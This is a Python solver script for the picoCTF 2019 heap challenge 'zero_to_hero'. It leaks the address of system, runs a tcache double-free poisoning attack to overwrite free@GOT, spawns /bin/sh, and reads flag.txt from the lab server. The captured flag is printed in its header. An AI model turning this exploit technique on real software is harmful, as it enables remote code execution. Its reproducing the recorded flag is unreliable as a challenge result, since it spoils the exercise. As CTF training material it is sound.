# 75 - zero_to_hero  (Binary Exploitation, picoCTF 2019)
# Flag: academy{i_th0ught_2.29_f1x3d_d0ubl3_fr33?_aCb7bCF5}
# Write-up: ../../../writeups/binary-exploitation/75-zero-to-hero.md
# This is the script that produced the flag; historical variants are in archive/.
#
import sys, re, time, socket, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
host, port = "xebec.cylabacademy.net", 48532
FREE_GOT = 0x601f80
SIZE = 0x408


def conn():
    s = socket.create_connection((host, port), timeout=15)
    s.settimeout(4)
    return s


def drain(s, t=0.45):
    buf = b""
    t0 = time.time()
    while time.time() - t0 < t:
        try:
            c = s.recv(8192)
            if not c:
                break
            buf += c
        except socket.timeout:
            break
    return buf


def add(s, data):
    s.sendall(b"1\n")
    time.sleep(0.25)
    drain(s)
    s.sendall(str(SIZE).encode() + b"\n")
    time.sleep(0.25)
    drain(s)
    s.sendall(data)
    time.sleep(0.35)
    return drain(s)


def rem(s, idx):
    s.sendall(b"2\n")
    time.sleep(0.25)
    drain(s)
    s.sendall(str(idx).encode() + b"\n")
    time.sleep(0.35)
    return drain(s)


s = conn()
out = drain(s)
print("banniere:", out[:200])
s.sendall(b"y\n")
time.sleep(0.5)
leak_out = b""
t0 = time.time()
while b"0x" not in leak_out and time.time() - t0 < 6:
    try:
        c = s.recv(4096)
        if not c:
            break
        leak_out += c
    except socket.timeout:
        break
m = re.search(rb"0x[0-9a-f]+", leak_out)
if not m:
    print("pas de leak:", leak_out[:200])
    sys.exit(1)
system = int(m.group(0), 16)
print("system = 0x%x" % system)
# 1) A, 2) C ("/bin/sh"), 3) B
add(s, b"AAAA")
add(s, b"/bin/sh\x00")
add(s, b"BBBB")
# double free : A, B, A  (le controle de cle tcache ne regarde que la tete)
rem(s, 0)
rem(s, 2)
rem(s, 0)
# empoisonnement : A->fd = free@got, puis malloc renvoie free@got
add(s, struct.pack("<Q", FREE_GOT))
add(s, struct.pack("<Q", system))
# declenchement : free(C) -> system("/bin/sh")
o = rem(s, 1)
print("declenchement:", o[-150:])
time.sleep(0.5)
s.sendall(b"cat flag.txt; ls; echo FIN\n")
res = b""
t0 = time.time()
while time.time() - t0 < 8:
    try:
        c = s.recv(8192)
        if not c:
            break
        res += c
        if b"FIN" in res:
            break
    except socket.timeout:
        break
s.close()
txt = res.decode("latin-1", "replace")
print("=== resultat ===")
print(txt[:800])
fm = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
print("FLAG:", fm.group(0) if fm else None)
